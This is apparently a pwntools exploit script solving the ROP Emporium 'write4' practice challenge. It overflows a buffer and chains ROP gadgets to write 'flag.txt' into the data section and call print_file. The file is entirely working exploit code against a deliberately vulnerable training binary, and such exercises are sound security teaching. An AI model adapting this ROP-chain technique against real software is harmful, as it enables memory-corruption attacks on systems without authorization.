from pwn import *

context.arch = "amd64"

elf = context.binary = ELF("./write4")

# address of our data section; store this in r14
DATA_PTR = p64(0x601028)
PRINTFILE = p64(elf.symbols.print_file)
# PRINTFILE = p64(0x400500)
# file to read; store this in r15
PATH = b'flag.txt'

# mov qword ptr [r14], r15; ret
MOV_DATA_GADGET = p64(0x400628)
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x400690)
# pop rdi; ret
POP_RDI_GADGET = p64(0x400693)

payload = b'A' * 40

# set up for jump to pop r14, then r15
payload += POP_R14_R15_GADGET
# first pop r14
payload += DATA_PTR
# then pop r15
payload += PATH
# ret to move data
payload += MOV_DATA_GADGET
# ret to pop rdi
payload += POP_RDI_GADGET
# pop address of data into rdi
payload += DATA_PTR
# ret to print_file
payload += PRINTFILE

conn = process("./write4")
conn.recvuntil(b'> ')
conn.send(payload)

recved = conn.recvall()
print(recved.decode("ascii"))

# import sys
# sys.stdout.buffer.write(payload)
